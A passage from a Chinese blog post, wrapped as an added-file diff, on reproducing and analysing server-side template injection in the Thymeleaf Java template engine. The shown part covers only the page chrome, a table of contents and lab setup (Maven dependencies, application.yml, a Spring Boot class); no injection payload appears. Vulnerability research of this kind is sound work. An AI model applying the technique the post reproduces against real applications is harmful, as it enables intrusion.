@@ -1,0 +1,492 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Thymeleaf的SSTI复现与分析介绍Thymeleaf 是一个流行的 Java Web 视图模板引擎，可以方便地将数据和 HTML 模板结合起来生成网页。但是在使用 Thymeleaf 的过程中，如果没有严格控制用户输入，可能会发生模板注入漏洞。 环境搭建 添加Java包和resources包  pom.xml 1234567891011121314151617181920212223242">
+<meta property="og:type" content="article">
+<meta property="og:title" content="兀自">
+<meta property="og:url" content="https://garckz.github.io/2023/05/23/Thymeleaf%E7%9A%84SSTI%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="兀自">
+<meta property="og:description" content="Thymeleaf的SSTI复现与分析介绍Thymeleaf 是一个流行的 Java Web 视图模板引擎，可以方便地将数据和 HTML 模板结合起来生成网页。但是在使用 Thymeleaf 的过程中，如果没有严格控制用户输入，可能会发生模板注入漏洞。 环境搭建 添加Java包和resources包  pom.xml 1234567891011121314151617181920212223242">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://garckz.github.io/2023/05/23/Thymeleaf%E7%9A%84SSTI%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/SfzSoqBmvjC9NjT6RvVuNoj6B6l7hgM9PoMDmY0vCkQ.png">
+<meta property="og:image" content="https://garckz.github.io/2023/05/23/Thymeleaf%E7%9A%84SSTI%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/ecB_yscdSID4P_bTQNVI-zYUR7Meu-HHd9VlJfybx7w.png">
+<meta property="og:image" content="https://garckz.github.io/2023/05/23/Thymeleaf%E7%9A%84SSTI%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/9PW7aCWq0XIh8hrnZNkKgFlyqLTnstDjCszcSJRwe8w.png">
+<meta property="og:image" content="https://garckz.github.io/2023/05/23/Thymeleaf%E7%9A%84SSTI%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/w46yACUTr-5KrP5NK2MiVbv5Uan0SUbiGgyxdjkaVKU.png">
+<meta property="og:image" content="https://garckz.github.io/2023/05/23/Thymeleaf%E7%9A%84SSTI%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/gM4QKwKFcwJHZPVp1K7uRlBPWxxNOfeC5PSvPs1fBjs.png">
+<meta property="og:image" content="https://garckz.github.io/2023/05/23/Thymeleaf%E7%9A%84SSTI%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/X8oo0HHQq3yTW7lfM2Ph1H4Mxl7WjJDEojfgzJH7YO0.png">
+<meta property="og:image" content="https://garckz.github.io/2023/05/23/Thymeleaf%E7%9A%84SSTI%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/pANthOzVC_ScNmdNOWddChdrfod16NZNy7kYrWl0yq0.png">
+<meta property="og:image" content="https://garckz.github.io/2023/05/23/Thymeleaf%E7%9A%84SSTI%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/WN2EnHZ_xyLglPRq-rYXr0xtMRCmtXu5fy-30jvN4qY.png">
+<meta property="og:image" content="https://garckz.github.io/2023/05/23/Thymeleaf%E7%9A%84SSTI%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/lna3ce4nVCydtd8coNVnehDaYqv_pdcG3qab3DA8MQA.png">
+<meta property="og:image" content="https://garckz.github.io/2023/05/23/Thymeleaf%E7%9A%84SSTI%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/upJsQXDdiyNT--4vjCqs_oF5wZpxE--M10Eh2bp05dw.png">
+<meta property="og:image" content="https://garckz.github.io/2023/05/23/Thymeleaf%E7%9A%84SSTI%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/39o45C1Lf7BSmiT2B3n4TGSAHJUKMR32k_BeKrOhVuc.png">
+<meta property="og:image" content="https://garckz.github.io/2023/05/23/Thymeleaf%E7%9A%84SSTI%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/NYCpxpSlZDfNo3YQWo8WBYj_pNirXQ2_QKgLoLHOW6M.png">
+<meta property="og:image" content="https://garckz.github.io/2023/05/23/Thymeleaf%E7%9A%84SSTI%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/G-bRju-URSTl6dq17pXyv2k3DrM-AWKP71tjoXNPyAU.png">
+<meta property="og:image" content="https://garckz.github.io/2023/05/23/Thymeleaf%E7%9A%84SSTI%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/tOgIA6c-N2YWDqhwtn2Qbk7k5AghIR-hZCq0HiuS8R4.png">
+<meta property="og:image" content="https://garckz.github.io/2023/05/23/Thymeleaf%E7%9A%84SSTI%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/A_6Jj_ulqGpI4sKH_XdvJLnanMb4cRytlb1jsAMEOzs.png">
+<meta property="og:image" content="https://garckz.github.io/2023/05/23/Thymeleaf%E7%9A%84SSTI%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/Ha3472ZAU3rQBGcGGP4zuBF0aBIrZCuyVVr2_KdlX4k.png">
+<meta property="og:image" content="https://garckz.github.io/2023/05/23/Thymeleaf%E7%9A%84SSTI%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/mz9s1yEdL-un_gS7yP3V-vF9G0Lz8hCmnwX-8V47Z7w.png">
+<meta property="og:image" content="https://garckz.github.io/2023/05/23/Thymeleaf%E7%9A%84SSTI%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/64U7bf16Iv-0R3x8a2du3TE39qHgVByo-r2YFHPJGEA.png">
+<meta property="og:image" content="https://garckz.github.io/2023/05/23/Thymeleaf%E7%9A%84SSTI%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/fgZ2tlRIQiY911Vkc4MqM2m2gWGsbvHtAaz5M9uZS9U.png">
+<meta property="og:image" content="https://garckz.github.io/2023/05/23/Thymeleaf%E7%9A%84SSTI%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/zRxC97t-uBwsshqxp42aD7YC_Ch9qSmaLYnOEYP8lTg.png">
+<meta property="og:image" content="https://garckz.github.io/2023/05/23/Thymeleaf%E7%9A%84SSTI%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/9rAHyXBKXO7Id7wUFJfOugU6jeHVQMkCY2BBXqsawas.png">
+<meta property="og:image" content="https://garckz.github.io/2023/05/23/Thymeleaf%E7%9A%84SSTI%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/SxJ-W5GrA7Lj7xK4I422RDDOLz3N5jVL2pifCfV-2ig.png">
+<meta property="og:image" content="https://garckz.github.io/2023/05/23/Thymeleaf%E7%9A%84SSTI%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/hDXsDmsQ8OKUP42Lt9CpkO3o3phgis_SN1CBQtWKIFY.png">
+<meta property="og:image" content="https://garckz.github.io/2023/05/23/Thymeleaf%E7%9A%84SSTI%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/Q1ujRJo4a6PB82VUNdfQm3z1sknvesEAVhwQWRjE19c.png">
+<meta property="og:image" content="https://garckz.github.io/2023/05/23/Thymeleaf%E7%9A%84SSTI%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/Rxha9Q6rsoH1nWYawYNyaeVr5A09eKm-tMiZy0CpWnc.png">
+<meta property="og:image" content="https://garckz.github.io/2023/05/23/Thymeleaf%E7%9A%84SSTI%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/v6mT0K9RBwObIUIOod4qs6UuXvkrI6rcll8eMSoPwWA.png">
+<meta property="og:image" content="https://garckz.github.io/2023/05/23/Thymeleaf%E7%9A%84SSTI%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/VmLlO7DWY78gR-N4G226bRLW3ViXKVYYVnCmm_kVfQc.png">
+<meta property="og:image" content="https://garckz.github.io/2023/05/23/Thymeleaf%E7%9A%84SSTI%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/XxxuU2r4n3E1mhBz98cQ8EpO5e5cyQvEXA3CS5H3Jcs.png">
+<meta property="og:image" content="https://garckz.github.io/2023/05/23/Thymeleaf%E7%9A%84SSTI%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/hArY-lvFyp6UFLRTBFmoJ7epnCYupS_c2aCT3w8ZhWE.png">
+<meta property="og:image" content="https://garckz.github.io/2023/05/23/Thymeleaf%E7%9A%84SSTI%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/6LaA8CBRDPXwcBkWLW8Np83AKH9CBoWQcPUdeEVStdU.png">
+<meta property="og:image" content="https://garckz.github.io/2023/05/23/Thymeleaf%E7%9A%84SSTI%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/BLLiYnuYt1DGvjZPJyZz3usS8B6dg2M3nbb_jeps36o.png">
+<meta property="og:image" content="https://garckz.github.io/2023/05/23/Thymeleaf%E7%9A%84SSTI%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/dASw_k2xVTOLT47G7ts2HTUS_p_mOzxMqupOXiozV6E.png">
+<meta property="og:image" content="https://garckz.github.io/2023/05/23/Thymeleaf%E7%9A%84SSTI%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/h9ffxi7Kg30LTUg5Nc9oxdQv8kWJr1ZbGWdEZL7AsxU.png">
+<meta property="og:image" content="https://garckz.github.io/2023/05/23/Thymeleaf%E7%9A%84SSTI%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/TCrWTzmvZz2PUxJuax8-p7QwkNJ32uWS0ZR0Mpr7TwQ.png">
+<meta property="og:image" content="https://garckz.github.io/2023/05/23/Thymeleaf%E7%9A%84SSTI%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/QfzEJJwG2yPvKX6iPU5Zt1vI9B26heyMZlu0i1nzDf8.png">
+<meta property="og:image" content="https://garckz.github.io/2023/05/23/Thymeleaf%E7%9A%84SSTI%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/Zz-P7UCZAzQ-ITKSeQtqYMXG0xw907ctzUqal1LTuxU.png">
+<meta property="og:image" content="https://garckz.github.io/2023/05/23/Thymeleaf%E7%9A%84SSTI%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/Glzsvp8QC3KxO_D6SqF4-rxzC7arF-ymCxjo6WyQh5o.png">
+<meta property="og:image" content="https://garckz.github.io/2023/05/23/Thymeleaf%E7%9A%84SSTI%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/IWGmVxzna6lKOKC953_kqmMj2BPxXnODz7vKo4WCwr0.png">
+<meta property="og:image" content="https://garckz.github.io/2023/05/23/Thymeleaf%E7%9A%84SSTI%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/XCNeHvySqccF4wE9w2m6Zft4aD4TJsVUxiVTxBn2euQ.png">
+<meta property="og:image" content="https://garckz.github.io/2023/05/23/Thymeleaf%E7%9A%84SSTI%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/Yi0NliqI420ww5cXZB7tt63D55M2496Ap2ewqBAMvOM.png">
+<meta property="og:image" content="https://garckz.github.io/2023/05/23/Thymeleaf%E7%9A%84SSTI%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/eqE5ZF37w9-TAeou6RLtr7CysxxDD7qMqaAgM23wT2g.png">
+<meta property="og:image" content="https://garckz.github.io/2023/05/23/Thymeleaf%E7%9A%84SSTI%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/FrYU4DJ8NxtpUSPbr2Jti7AuRb8UVhnrVEGasNqltLc.png">
+<meta property="og:image" content="https://garckz.github.io/2023/05/23/Thymeleaf%E7%9A%84SSTI%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/kzystS4Asr-inkRBPQ1i6uhzgS3WHLQMpryrtVhag3M.png">
+<meta property="og:image" content="https://garckz.github.io/2023/05/23/Thymeleaf%E7%9A%84SSTI%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/o27q8Sx0mxQMudsxOj5utgUcxpEht3cqcsFU6R3mogU.png">
+<meta property="article:published_time" content="2023-05-23T12:36:41.324Z">
+<meta property="article:modified_time" content="2023-05-23T12:37:01.527Z">
+<meta property="article:author" content="Garck3h">
+<meta property="article:tag" content="代码审计,内网渗透,Web安全,Secure">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://garckz.github.io/2023/05/23/Thymeleaf%E7%9A%84SSTI%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/SfzSoqBmvjC9NjT6RvVuNoj6B6l7hgM9PoMDmY0vCkQ.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>兀自</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">文章</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2023/05/10/MINI%E5%A4%A9%E7%8C%AB%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://garckz.github.io/2023/05/23/Thymeleaf%E7%9A%84SSTI%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://garckz.github.io/2023/05/23/Thymeleaf%E7%9A%84SSTI%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/&text="><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://garckz.github.io/2023/05/23/Thymeleaf%E7%9A%84SSTI%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/&title="><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://garckz.github.io/2023/05/23/Thymeleaf%E7%9A%84SSTI%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/&is_video=false&description="><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=&body=Check out this article: https://garckz.github.io/2023/05/23/Thymeleaf%E7%9A%84SSTI%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://garckz.github.io/2023/05/23/Thymeleaf%E7%9A%84SSTI%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/&title="><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://garckz.github.io/2023/05/23/Thymeleaf%E7%9A%84SSTI%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/&title="><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://garckz.github.io/2023/05/23/Thymeleaf%E7%9A%84SSTI%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/&title="><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://garckz.github.io/2023/05/23/Thymeleaf%E7%9A%84SSTI%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/&title="><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://garckz.github.io/2023/05/23/Thymeleaf%E7%9A%84SSTI%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/&name=&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://garckz.github.io/2023/05/23/Thymeleaf%E7%9A%84SSTI%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/&t="><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Thymeleaf%E7%9A%84SSTI%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">Thymeleaf的SSTI复现与分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.1.</span> <span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.2.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.3.</span> <span class="toc-text">复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">1.4.</span> <span class="toc-text">分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#doDispatch"><span class="toc-number">1.4.1.</span> <span class="toc-text">doDispatch</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%89%8D%E7%AB%AF%E6%8E%A7%E5%88%B6%E5%99%A8%E6%8B%A6%E6%88%AA%E7%94%A8%E6%88%B7%E7%9A%84%E8%AF%B7%E6%B1%82"><span class="toc-number">1.4.2.</span> <span class="toc-text">1.前端控制器拦截用户的请求</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%A4%84%E7%90%86%E5%99%A8%E6%98%A0%E5%B0%84%E5%99%A8%E6%89%A7%E8%A1%8C%E7%94%A8%E6%88%B7%E7%9A%84%E8%AF%B7%E6%B1%82"><span class="toc-number">1.4.3.</span> <span class="toc-text">2.处理器映射器执行用户的请求</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%8E%B7%E5%8F%96%E5%A4%84%E7%90%86%E5%99%A8%E9%80%82%E9%85%8D%E5%99%A8HandlerAdpater"><span class="toc-number">1.4.4.</span> <span class="toc-text">3.获取处理器适配器HandlerAdpater</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%A4%84%E7%90%86%E5%99%A8%E9%80%82%E9%85%8D%E5%99%A8%E5%AF%B9Handler%E8%BF%9B%E8%A1%8C%E5%A4%84%E7%90%86"><span class="toc-number">1.4.5.</span> <span class="toc-text">4.处理器适配器对Handler进行处理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E5%A4%84%E7%90%86%E6%B4%BE%E5%8F%91%E7%BB%93%E6%9E%9C"><span class="toc-number">1.4.6.</span> <span class="toc-text">5.处理派发结果</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.5.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E5%BC%8F"><span class="toc-number">1.6.</span> <span class="toc-text">修复方式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">1.7.</span> <span class="toc-text">参考</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Garck3h</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-05-23T12:36:41.324Z" class="dt-published" itemprop="datePublished">2023-05-23</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="Thymeleaf的SSTI复现与分析"><a href="#Thymeleaf的SSTI复现与分析" class="headerlink" title="Thymeleaf的SSTI复现与分析"></a>Thymeleaf的SSTI复现与分析</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>Thymeleaf 是一个流行的 Java Web 视图模板引擎，可以方便地将数据和 HTML 模板结合起来生成网页。但是在使用 Thymeleaf 的过程中，如果没有严格控制用户输入，可能会发生模板注入漏洞。</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><img src="SfzSoqBmvjC9NjT6RvVuNoj6B6l7hgM9PoMDmY0vCkQ.png" alt="image"></p>
+<p>添加Java包和resources包</p>
+<p><img src="ecB_yscdSID4P_bTQNVI-zYUR7Meu-HHd9VlJfybx7w.png" alt="image"></p>
+<p>pom.xml</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 继承父包 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.3.5.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- web启动jar --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.projectlombok<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>lombok<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.18.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-thymeleaf<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>application.yml，放在resources(原本没有，需要创建)</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">server:</span><br><span class="line">  port: 8090</span><br><span class="line">spring:</span><br><span class="line">  thymeleaf:</span><br><span class="line">    prefix: classpath:/templates/</span><br><span class="line">    suffix: .html</span><br><span class="line">    mode: HTML5</span><br><span class="line">    encoding: UTF-8</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>启动类（放在com.garck3h下）</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.garck3h;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.SpringApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by IntelliJ IDEA.</span></span><br><span 